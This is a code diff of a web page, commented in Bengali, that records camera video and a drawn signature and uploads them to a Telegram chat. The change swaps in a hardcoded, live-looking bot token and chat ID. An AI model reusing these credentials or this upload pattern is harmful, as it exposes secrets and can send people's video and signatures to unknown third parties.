@@ -41,10 +41,12 @@
     let recordedChunks = [];
     let drawing = false;
     let videoBlob = null;
+    let stream = null;
 
     // ক্যামেরা চালু
-    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-      .then(stream => {
+    async function startCamera() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
         video.srcObject = stream;
         mediaRecorder = new MediaRecorder(stream);
         mediaRecorder.ondataavailable = e => {
@@ -54,12 +56,30 @@
           videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
           submitBtn.disabled = false;
           result.textContent = "✅ ভিডিও রেকর্ড শেষ হয়েছে, এখন সাবমিট করতে পারেন।";
+          stopCamera(); // রেকর্ড শেষ হলে ক্যামেরা বন্ধ
         };
-      })
-      .catch(err => alert("ক্যামেরা চালু করা যাচ্ছে না: " + err));
+      } catch (err) {
+        alert("ক্যামেরা চালু করা যাচ্ছে না: " + err);
+      }
+    }
+
+    startCamera();
+
+    // ক্যামেরা বন্ধ
+    function stopCamera() {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        video.srcObject = null;
+        stream = null;
+      }
+    }
 
     // রেকর্ড শুরু
     startRecBtn.onclick = () => {
+      if (!mediaRecorder) {
+        alert("ক্যামেরা চালু হয়নি!");
+        return;
+      }
       recordedChunks = [];
       mediaRecorder.start();
       result.textContent = "🔴 ভিডিও রেকর্ডিং শুরু হয়েছে...";
@@ -70,10 +90,12 @@
 
     // রেকর্ড বন্ধ
     stopRecBtn.onclick = () => {
-      mediaRecorder.stop();
-      result.textContent = "⏹️ ভিডিও রেকর্ডিং বন্ধ হয়েছে।";
-      startRecBtn.disabled = false;
-      stopRecBtn.disabled = true;
+      if (mediaRecorder && mediaRecorder.state !== "inactive") {
+        mediaRecorder.stop();
+        result.textContent = "⏹️ ভিডিও রেকর্ডিং বন্ধ হয়েছে।";
+        startRecBtn.disabled = false;
+        stopRecBtn.disabled = true;
+      }
     };
 
     // স্বাক্ষর আঁকা
@@ -108,8 +130,8 @@
 
       result.textContent = "📤 ডেটা পাঠানো হচ্ছে...";
 
-      const botToken = "7075083128:AAGNo5wBZ3Y7B7Lexp5U4_-XuO-kxQVYeQY";
-      const chatId = "YOUR_CHAT_ID"; // এখানে আপনার চ্যাট আইডি বসান
+      const botToken = "7959394383:AAGeT74LkUMliX-PO5-ZtE72-rVysi_VdPc";
+      const chatId = "7772426586"; // আপনার টেলিগ্রাম চ্যাট আইডি এখানে বসানো হলো
 
       // ভিডিও পাঠানো (Document হিসেবে)
       const videoForm = new FormData();
